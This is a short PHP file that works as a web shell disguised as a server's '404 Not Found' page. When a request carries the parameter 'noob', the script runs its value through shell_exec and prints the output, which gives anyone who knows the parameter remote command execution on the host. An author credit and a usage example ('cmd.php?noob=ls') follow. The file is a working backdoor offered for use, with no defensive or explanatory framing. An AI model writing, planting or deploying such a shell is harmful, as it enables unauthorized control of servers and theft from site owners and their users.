<?php 


echo "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">
<html><head>
<title>404 Not Found</title>
</head>";

	if(isset($_REQUEST['noob'])){
		$cmd = shell_exec($_REQUEST['noob']);
		echo "<pre>$cmd</pre>";
	}else{
		echo "<body>
<h1>Not Found</h1>
<p>The requested URL ".$_SERVER['PHP_SELF']." "."was not found on this server.</p>
<hr>
<address>".$_SERVER['SERVER_SOFTWARE']."Server at ".$_SERVER['SERVER_ADDR']." Port ".$_SERVER['SERVER_PORT']."</address>
</body></html>";}

//coded by mdp4rv3z 
//example :: www.site.com/cmd.php?noob=ls
?>